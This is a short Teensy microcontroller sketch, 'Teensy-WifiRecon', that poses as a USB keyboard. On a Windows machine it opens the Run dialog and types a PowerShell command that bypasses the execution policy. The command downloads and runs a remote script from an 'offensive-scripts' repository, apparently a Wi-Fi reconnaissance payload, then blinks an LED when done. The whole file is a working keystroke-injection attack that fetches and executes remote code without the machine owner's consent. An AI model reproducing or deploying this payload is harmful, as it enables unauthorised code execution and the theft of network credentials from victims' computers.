/*
 * Teensy-WifiRecon
*/

int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif

void setup()
{
  pinMode(LED_PIN, OUTPUT);
  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("powershell -exec bypass -c IEX(New-object Net.Webclient).Downloadstring('https://raw.githubusercontent.com/timebotdon/offensive-scripts/master/Windows/wifirecon.ps1')");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void loop()
{
  // blink when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
